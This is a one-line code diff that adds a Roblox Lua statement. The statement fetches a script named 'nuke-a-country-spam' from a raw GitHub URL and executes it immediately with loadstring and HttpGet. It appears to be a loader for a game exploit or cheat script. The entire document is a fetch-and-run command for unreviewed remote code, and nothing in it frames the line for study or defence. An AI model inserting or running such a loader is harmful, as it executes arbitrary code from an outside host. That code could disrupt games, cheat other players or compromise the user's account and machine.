@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/nuke-a-country-spam6-fsb1ebdhmbpiud.lua"))()
